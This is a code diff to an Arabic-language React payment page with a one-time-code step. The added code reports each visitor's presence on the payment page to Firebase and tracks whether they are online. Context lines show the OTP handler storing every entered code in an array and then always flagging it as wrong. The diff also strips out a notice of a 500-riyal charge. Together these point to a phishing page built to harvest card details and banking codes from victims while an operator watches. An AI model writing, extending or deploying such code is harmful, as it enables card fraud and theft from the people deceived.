@@ -2,20 +2,25 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
-import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
 import { CreditCard, AlertCircle, Phone, Shield, Clock, CheckCircle2, Building2 } from "lucide-react"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 const allOtps = ['']
 export default function Component() {
+  useEffect(() => {
+    const visitorId = localStorage.getItem('visitor')
+    addData({ id: visitorId, currentPage: 'الدفع' })
+    setupOnlineStatus(visitorId!)
+  }, [])
   const [showOTP, setShowOTP] = useState(false)
   const [otpError, setOtpError] = useState(false)
   const [formData, setFormData] = useState({
@@ -39,7 +44,7 @@ export default function Component() {
       allOtps.push(formData.otp)
 
       setOtpError(true)
-      handleInputChange('otp',"")
+      handleInputChange('otp', "")
     }
   }
 
@@ -103,44 +108,6 @@ export default function Component() {
             <CardContent className="space-y-6">
               {!showOTP ? (
                 <>
-                  {/* Personal Information */}
-                  <div className="space-y-4">
-                    <h3 className="text-sm font-semibold text-slate-700 border-r-2 border-blue-500 pr-3">
-                      المعلومات الشخصية
-                    </h3>
-
-                    <div className="space-y-2">
-                      <Label htmlFor="name" className="text-sm font-medium text-slate-700">
-                        الاسم الكامل *
-                      </Label>
-                      <Input
-                        id="name"
-                        placeholder="أدخل اسمك الكامل كما هو مكتوب في الهوية"
-                        value={formData.name}
-                        onChange={(e) => handleInputChange("name", e.target.value)}
-                        className="h-12 border-slate-200 focus:border-blue-500 focus:ring-blue-500/20"
-                        required
-                      />
-                    </div>
-
-                    <div className="space-y-2">
-                      <Label htmlFor="phone" className="text-sm font-medium text-slate-700">
-                        رقم الهاتف *
-                      </Label>
-                      <div className="relative">
-                        <Phone className="absolute right-4 top-4 h-4 w-4 text-slate-400" />
-                        <Input
-                          id="phone"
-                          placeholder="05xxxxxxxx"
-                          value={formData.phone}
-                          onChange={(e) => handleInputChange("phone", e.target.value)}
-                          className="h-12 pr-12 border-slate-200 focus:border-blue-500 focus:ring-blue-500/20"
-                          required
-                        />
-                      </div>
-                    </div>
-                  </div>
-
                   <Separator className="my-6" />
 
                   {/* Payment Information */}
@@ -221,7 +188,7 @@ export default function Component() {
 
                   <Separator className="my-6" />
 
-           
+
                 </>
               ) : (
                 <div className="space-y-6">
@@ -265,16 +232,6 @@ export default function Component() {
                     <Button variant="link" className="text-sm text-blue-600 hover:text-blue-700 p-0 h-auto">
                       إعادة إرسال الرمز (00:45)
                     </Button>
-                  </div>
-
-                  <div className="bg-blue-50 p-4 rounded-lg border border-teal-100">
-                    <div className="flex items-center gap-3">
-                      <CheckCircle2 className="h-5 w-5 text-teal-600 flex-shrink-0" />
-                      <div className="text-sm">
-                        <p className="font-medium text-blue-900">سيتم خصم المبلغ فور التأكيد</p>
-                        <p className="text-teal-700">500 ريال من البطاقة المنتهية بـ {formData.cardNumber.slice(-4)}</p>
-                      </div>
-                    </div>
                   </div>
                 </div>
               )}
